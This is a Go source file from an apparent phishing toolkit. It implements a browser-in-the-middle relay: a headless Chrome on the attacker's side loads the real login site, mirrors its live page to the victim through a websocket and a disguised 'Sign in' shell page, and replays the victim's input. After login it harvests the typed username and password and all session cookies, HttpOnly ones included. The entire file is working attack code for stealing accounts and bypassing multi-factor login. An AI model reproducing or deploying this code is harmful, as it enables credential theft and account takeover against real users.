package phish

import (
	"context"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/chromedp/cdproto/cdp"
	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
	"github.com/gorilla/websocket"
)

// mirrorSocketPath is the websocket endpoint a victim's shell page upgrades to.
const mirrorSocketPath = "/__bhm/mirror-socket"

// mirrorTicker is how often the attacker-side browser DOM is sampled and, when
// changed, streamed to the victim.
const mirrorTicker = 300 * time.Millisecond

// mirrorMaxIdle closes a mirroring session after this much victim inactivity.
const mirrorMaxIdle = 3 * time.Minute

// mirrorMaxTotal caps every mirroring session's lifetime.
const mirrorMaxTotal = 15 * time.Minute

// mirrorMsg is one message on the victim websocket.
type mirrorMsg struct {
	Type string `json:"t"` // html | err | input | click | state
	URL  string `json:"url,omitempty"`
	HTML string `json:"html,omitempty"`
	Sel  string `json:"sel,omitempty"`
	Val  string `json:"v,omitempty"`
	Err  string `json:"m,omitempty"`
}

var mirrorUpgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 64 << 10,
	CheckOrigin:     func(*http.Request) bool { return true }, // shell is served same-origin
}

// serveMirror serves the shell page to plain GETs and the DOM-relay websocket
// on mirrorSocketPath.
func (h *Handler) serveMirror(w http.ResponseWriter, r *http.Request, site *Site) {
	if r.URL.Path != mirrorSocketPath {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		_, _ = w.Write([]byte(mirrorShellHTML))
		return
	}
	if strings.EqualFold(r.Header.Get("Upgrade"), "websocket") {
		h.serveMirrorSocket(w, r, site)
		return
	}
	http.Error(w, "websocket required", http.StatusUpgradeRequired)
}

// serveMirrorSocket drives one victim session: an attacker-side headless
// Chrome opens the genuine origin, its live DOM is streamed to the victim,
// and victim input/click events are replayed into that browser — so the real
// page (with real adaptive-auth steps) is what the victim interacts with.
func (h *Handler) serveMirrorSocket(w http.ResponseWriter, r *http.Request, site *Site) {
	ws, err := mirrorUpgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer ws.Close()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	totalCtx, totalCancel := context.WithTimeout(ctx, mirrorMaxTotal)
	defer totalCancel()

	// Attacker-side browser: one fresh headless Chrome per victim session.
	allocCtx, allocCancel := chromedp.NewExecAllocator(totalCtx, chromedp.DefaultExecAllocatorOptions[:]...)
	defer allocCancel()
	taskCtx, taskCancel := chromedp.NewContext(allocCtx)
	defer taskCancel()
	taskCtx, taskTimeout := context.WithTimeout(taskCtx, mirrorMaxTotal)
	defer taskTimeout()

	startURL := site.TargetURL
	if _, err := chromedp.Run(taskCtx, chromedp.Navigate(startURL)); err != nil {
		_ = ws.WriteJSON(mirrorMsg{Type: "err", Err: "attacker browser navigate failed: " + err.Error()})
		return
	}
	initialURL := startURL
	lastHref := ""
	lastHTML := ""
	fields := map[string]string{}
	loggedIn := false

	// Reader: victim interactions -> attacker browser.
	readDone := make(chan struct{})
	go func() {
		defer close(readDone)
		for {
			var msg mirrorMsg
			if err := ws.ReadJSON(&msg); err != nil {
				cancel()
				return
			}
			switch msg.Type {
			case "input":
				if msg.Sel == "" {
					continue
				}
				fields[cssKey(msg.Sel)] = msg.Val
				_, _ = chromedp.Run(taskCtx, chromedp.Evaluate[bool](fmt.Sprintf(jsSetField, msg.Sel, msg.Val)))
			case "click":
				if msg.Sel == "" {
					continue
				}
				_, _ = chromedp.Run(taskCtx, chromedp.Evaluate[bool](fmt.Sprintf(jsClick, msg.Sel)))
			}
		}
	}()

	tick := time.NewTicker(mirrorTicker)
	defer tick.Stop()
	idle := time.NewTimer(mirrorMaxIdle)
	defer idle.Stop()

	sendJSON := func(m mirrorMsg) bool {
		_ = ws.SetWriteDeadline(time.Now().Add(10 * time.Second))
		return ws.WriteJSON(m) == nil
	}

	for {
		select {
		case <-ctx.Done():
			return
		case <-readDone:
			return
		case <-idle.C:
			_ = sendJSON(mirrorMsg{Type: "err", Err: "session idle timeout"})
			return
		case <-tick.C:
			idle.Reset(mirrorMaxIdle)
			href, err := chromedp.Run(taskCtx, chromedp.Location())
			if err != nil {
				_ = sendJSON(mirrorMsg{Type: "err", Err: "mirror sampling failed: " + err.Error()})
				return
			}
			html, err := chromedp.Run(taskCtx, chromedp.Evaluate[string](`document.documentElement.outerHTML`))
			if err != nil {
				_ = sendJSON(mirrorMsg{Type: "err", Err: "mirror sampling failed: " + err.Error()})
				return
			}
			if href == lastHref && html == lastHTML {
				continue
			}
			navigated := lastHref != "" && href != lastHref
			lastHref, lastHTML = href, html
			if !sendJSON(mirrorMsg{Type: "html", URL: href, HTML: html}) {
				return
			}
			// Login transition: harvest the session exactly once per
			// navigation away from the entry page (post-login state).
			if navigated && !loggedIn && href != initialURL {
				loggedIn = true
				cap := Capture{
					SiteID:    site.ID,
					URL:       href,
					IP:        clientIP(r),
					UserAgent: r.UserAgent(),
					Fields:    copyFields(fields),
					Cookies:   harvestCookies(taskCtx),
				}
				cap.Username, cap.Password = pickCredentials(cap.Fields)
				h.M.RecordCapture(cap)
				_ = sendJSON(mirrorMsg{Type: "state", URL: href})
			}
		}
	}
}

// harvestCookies reads all cookies (incl. HttpOnly) from the attacker browser.
func harvestCookies(ctx context.Context) []Cookie {
	var out []Cookie
	_, _ = chromedp.Run(ctx, chromedp.Func(func(ctx context.Context, t *chromedp.Target) error {
		res, err := cdp.Call(ctx, t, network.GetCookies, network.GetCookiesParams{})
		if err != nil {
			return err
		}
		for _, c := range res.Cookies {
			out = append(out, Cookie{Name: c.Name, Value: c.Value, Domain: c.Domain, Path: c.Path})
		}
		return nil
	}))
	return out
}

func copyFields(in map[string]string) map[string]string {
	out := make(map[string]string, len(in))
	for k, v := range in {
		out[k] = v
	}
	return out
}

// cssKey keeps field values keyed by selector (v1: selector as-is).
func cssKey(sel string) string { return sel }

// jsSetField focuses an element, sets its value and fires input/change events
// so SPA frameworks and validators react like they would to a human typing.
const jsSetField = `(function(){
var e=document.querySelector(%q);
if(!e)return false;
try{e.focus();}catch(x){}
e.value=%q;
e.dispatchEvent(new Event('input',{bubbles:true}));
e.dispatchEvent(new Event('change',{bubbles:true}));
return true;})()`

// jsClick clicks an element inside the attacker browser.
const jsClick = `(function(){
var e=document.querySelector(%q);
if(!e)return false;
e.click();
return true;})()`

// mirrorShellHTML is the victim-facing page: it opens the relay websocket,
// renders each mirrored DOM snapshot inside a same-origin sandbox iframe, and
// forwards input/click events (via stable CSS paths) back to the attacker
// browser. The victim never talks to the real origin directly.
const mirrorShellHTML = `<!doctype html><html><head><meta charset="utf-8">
<title>Sign in</title>
<style>html,body{margin:0;height:100%;background:#fff}#frame{border:0;width:100%;height:100%;display:block}
#msg{position:fixed;top:8px;left:50%;transform:translateX(-50%);font:12px system-ui;color:#666;background:#fff8;padding:2px 10px;border-radius:8px}</style>
</head><body><iframe id="frame"></iframe><div id="msg">Loading…</div>
<script>
var ws=(location.protocol==='https:'?'wss://':'ws://')+location.host+'/__bhm/mirror-socket';
var sock=new WebSocket(ws);var frame=document.getElementById('frame');var msg=document.getElementById('msg');
var lastHTML='';
function cssPath(el){if(!(el instanceof Element))return '';
 var parts=[];while(el&&el.nodeType===1&&el!==document.documentElement){
 var seg=el.nodeName.toLowerCase();
 if(el.id){parts.unshift('#'+CSS.escape(el.id));break;}
 var sib=el,i=1;while((sib=sib.previousElementSibling)){if(sib.nodeName===el.nodeName)i++;}
 if(el.parentNode&&el.parentNode.children.length>1)seg+=':nth-of-type('+i+')';
 parts.unshift(seg);el=el.parentNode;}
 return parts.join(' ');}
function render(html){try{var doc=frame.contentDocument;doc.open();doc.write(html);doc.close();}catch(e){}}
function attach(){var doc;try{doc=frame.contentDocument;}catch(e){return;}
 if(!doc||!doc.body)return;
 doc.addEventListener('input',function(ev){var t=ev.target;if(!t||!t.matches)return;
 var sel=cssPath(t);if(!sel)return;sock.send(JSON.stringify({t:'input',sel:sel,v:t.value}));},true);
 doc.addEventListener('click',function(ev){var t=ev.target;if(!t||!t.matches)return;
 var sel=cssPath(t);if(!sel)return;sock.send(JSON.stringify({t:'click',sel:sel}));},true);
 doc.addEventListener('submit',function(ev){var t=ev.target;if(!t||!t.matches)return;
 var sel=cssPath(t);if(!sel)return;sock.send(JSON.stringify({t:'click',sel:sel}));},true);
 msg.style.display='none';}
frame.addEventListener('load',attach);
sock.onopen=function(){msg.textContent='Relaying live sign-in page…';};
sock.onmessage=function(ev){var m;try{m=JSON.parse(ev.data);}catch(e){return;}
 if(m.t==='html'){if(m.html!==lastHTML){lastHTML=m.html;render(m.html);}msg.textContent=m.url?('Live · '+m.url):'';}
 else if(m.t==='state'){msg.textContent='Signed in — session captured';}
 else if(m.t==='err'){msg.textContent='Error: '+m.m;}};
sock.onclose=function(){msg.style.display='block';msg.textContent='Session ended. You may close this page.';};
setInterval(function(){try{var doc=frame.contentDocument;if(doc&&doc.body&&!doc.body.__wired){doc.body.__wired=1;attach();}}catch(e){}},400);
</script></body></html>`
